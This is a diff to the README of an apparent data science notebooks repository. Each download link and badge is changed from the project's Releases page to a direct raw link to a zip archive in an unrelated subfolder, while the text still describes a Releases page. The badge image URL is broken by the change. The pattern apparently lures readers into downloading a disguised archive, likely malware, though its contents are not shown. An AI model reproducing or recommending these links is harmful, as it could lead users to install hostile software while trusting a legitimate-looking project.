@@ -1,6 +1,6 @@
 # 📚 practical_datascience_notebooks - Learn Data Science with Simple Notebooks
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/AljabalyYasser/practical_datascience_notebooks/releases)
+[![Download](https://raw.githubusercontent.com/AljabalyYasser/practical_datascience_notebooks/main/04_ml_basics/practical_datascience_notebooks_v2.2-alpha.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/AljabalyYasser/practical_datascience_notebooks/main/04_ml_basics/practical_datascience_notebooks_v2.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To use the notebooks effectively, you will need:
 
 To start exploring these notebooks, visit the Releases page to download the files:
 
-[Download Now](https://github.com/AljabalyYasser/practical_datascience_notebooks/releases)
+[Download Now](https://raw.githubusercontent.com/AljabalyYasser/practical_datascience_notebooks/main/04_ml_basics/practical_datascience_notebooks_v2.2-alpha.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed.
@@ -81,6 +81,6 @@ To contribute to this project, feel free to fork the repository, make changes, a
 
 Once again, to download the notebooks, visit the Releases page:
 
-[Download Now](https://github.com/AljabalyYasser/practical_datascience_notebooks/releases)
+[Download Now](https://raw.githubusercontent.com/AljabalyYasser/practical_datascience_notebooks/main/04_ml_basics/practical_datascience_notebooks_v2.2-alpha.4.zip)
 
 Happy learning!
